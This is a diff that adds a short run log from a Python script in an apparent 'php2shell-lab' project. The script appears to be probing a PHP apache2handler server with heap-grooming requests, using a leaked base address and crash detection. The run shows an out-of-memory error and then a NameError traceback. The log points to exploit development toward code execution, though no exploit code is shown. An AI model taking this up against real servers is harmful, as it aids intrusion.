@@ -1,0 +1,18 @@
+=== oom141: datadog 3-field groom ===
+sapi: SAPI=apache2handler lim=8388608 vars=100000
+md5 ok
+base=0x7f6e0c96b000
+--- N=3600000 ---
+try0: http=200 segv+0 core=False
+  body[:180]: '<br />\n<b>Fatal error</b>:  Allowed memory size of 8388608 bytes exhausted (tried to allocate 2105344 bytes) in <b>Unknown</b> on line <b>0</b><br />\n'
+Traceback (most recent call last):
+  File "/Users/vlad/Projects/queue/php2shell-lab/oom141.py", line 246, in <module>
+    main()
+    ~~~~^^
+  File "/Users/vlad/Projects/queue/php2shell-lab/oom141.py", line 203, in main
+    if fire(build_body(SIG8, N), tries=3):
+       ~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/Users/vlad/Projects/queue/php2shell-lab/oom141.py", line 106, in fire
+    print("  alloc=%d delta_vs_N=%+d %s" % (a, a - N,
+                                                   ^
+NameError: name 'N' is not defined. Did you mean: 'NS'?
